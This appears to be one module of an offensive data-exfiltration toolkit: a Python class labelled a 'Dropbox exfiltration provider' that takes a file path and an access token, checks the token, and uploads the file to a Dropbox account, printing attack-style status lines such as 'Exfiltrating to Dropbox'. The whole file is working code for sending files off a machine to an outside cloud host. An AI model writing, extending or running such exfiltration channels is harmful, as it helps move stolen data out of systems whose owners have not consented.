#!/usr/bin/env python3
"""
Dropbox provider
"""

from pathlib import Path
from .base_provider import BaseCloudProvider

class DropboxProvider(BaseCloudProvider):
    """Dropbox exfiltration provider"""
    
    def __init__(self):
        """Initialize Dropbox provider"""
        super().__init__('Dropbox')
    
    def upload_file(self, filepath, access_token, dest_path=None):
        """
        Upload file to Dropbox
        
        Args:
            filepath: Path to file
            access_token: Dropbox access token
            dest_path: Destination path (auto-generated if None)
            
        Returns:
            Upload result dict or None
        """
        try:
            import dropbox
            from dropbox.exceptions import ApiError
            
            print(f"[*] Exfiltrating to Dropbox")
            
            # Get file info
            file_info = self.get_file_info(filepath)
            print(f"[*] File: {file_info['filename']} ({file_info['size_mb']:.2f} MB)")
            
            # Create Dropbox client
            dbx = dropbox.Dropbox(access_token)
            
            # Verify token
            try:
                account = dbx.users_get_current_account()
                print(f"[*] Account: {account.email}")
            except ApiError as e:
                print(f"[-] Invalid Dropbox token: {e}")
                return None
            
            # Generate destination path if not provided
            if dest_path is None:
                dest_path = '/' + self.generate_backup_path(file_info['filename'])
            
            print(f"[*] Uploading to: {dest_path}")
            
            # Upload file
            with open(filepath, 'rb') as f:
                try:
                    metadata = dbx.files_upload(
                        f.read(), 
                        dest_path,
                        mode=dropbox.files.WriteMode.overwrite
                    )
                    
                    print(f"[+] Upload successful!")
                    print(f"[+] Path: {metadata.path_display}")
                    
                    return {
                        'service': self.service_name,
                        'path': metadata.path_display,
                        'filename': metadata.name,
                        'size_bytes': metadata.size,
                        'id': metadata.id
                    }
                
                except ApiError as e:
                    print(f"[-] Upload error: {e}")
                    return None
        
        except ImportError:
            print("[-] Dropbox SDK not installed")
            print("[!] Install: pip install dropbox")
            return None
        except Exception as e:
            print(f"[-] Dropbox error: {e}")
            return None
    
    def check_credentials(self, access_token):
        """Verify Dropbox credentials"""
        try:
            import dropbox
            from dropbox.exceptions import ApiError
            
            dbx = dropbox.Dropbox(access_token)
            dbx.users_get_current_account()
            return True
        
        except ApiError:
            return False
        except Exception:
            return False